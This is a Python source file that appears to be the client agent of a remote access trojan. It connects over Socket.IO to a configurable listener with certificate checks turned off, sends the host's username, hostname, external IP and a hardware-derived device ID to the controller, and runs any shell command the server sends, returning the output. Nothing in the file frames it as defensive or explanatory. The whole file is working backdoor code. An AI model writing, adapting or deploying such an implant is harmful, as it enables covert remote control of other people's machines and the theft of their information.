import os
import platform
import psutil
import requests
import socketio
import time
import uuid
import getpass
import subprocess

LHOST = "127.0.0.1"
LPORT = "8002"
LPATH = None
USE_HTTPS = False
DISABLE_CERT_VERIFY = True
IP_LOOKUP_API_URLS = ["http://ip-api.com/json/{}?fields=17039359"]
IP_API_URLS = ["https://api.seeip.org/jsonip", "https://api.ipify.org/?format=json"]
DEBUG = True


http_session = requests.Session() if DISABLE_CERT_VERIFY else requests.Session()
http_session.verify = False

sio = socketio.Client(http_session=http_session)


def get_ip():
    """Get the external IP address of the current machine using an external API"""
    for api in IP_API_URLS:
        try:
            return requests.get(api, timeout=3).json()["ip"]
        except:
            pass
    return None


def debug_print(msg):
    """Print the given message to the console if DEBUG mode is enabled"""
    if DEBUG:
        print(msg)


def generate_device_id():
    """Generate a unique device ID based on various hardware and system information"""
    hw_info = f"{uuid.getnode()}{psutil.cpu_count()}{' '.join(platform.processor().split()[:3])}{platform.system()}{platform.node()}{getpass.getuser()}"
    unique_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, hw_info))
    return unique_id


@sio.on("connect")
def connect():
    """Callback function for when the socketio client connects to the server"""
    debug_print("CON-EST")
    sio.emit("con-est")


@sio.on("info-req")
def info_req():
    """Callback function for when the server requests information about the client"""
    debug_print("INFO REQ")
    ip = get_ip()
    sio.emit(
        "info-rsp",
        {
            "user": os.getlogin(),
            "hostname": platform.node(),
            "ip": ip,
            "id": generate_device_id(),
        },
    )
    debug_print("INFO-SNT")


@sio.on("exec-cmd")
def exec_command(data):
    debug_print("EXEC-CMD - " + data["command"])
    if data["command"][:3].lower() == "cd ":
        os.chdir(data["command"][3:])
        sio.emit("exec-cmd-resp", "Change dir to: " + os.getcwd())
        return
    result = subprocess.run(
        data["command"],
        stdout=subprocess.PIPE,
        shell=True,
        timeout=5,
    )
    output = result.stdout
    output = output.decode()
    debug_print("EXEC-CMD-RESP")
    sio.emit("exec-cmd-resp", output)
    return


@sio.on("out")
def out(type_):
    """Callback function for when the server sends an 'out' event to the client"""
    debug_print(f"OUT - {type_}")
    if type_ == "kill":
        sio.disconnect()
        exit()


sio.connect(
    "{}://{}:{}/{}".format(
        "https" if USE_HTTPS else "http", LHOST, LPORT, LPATH if LPATH else "socket.io/"
    )
)
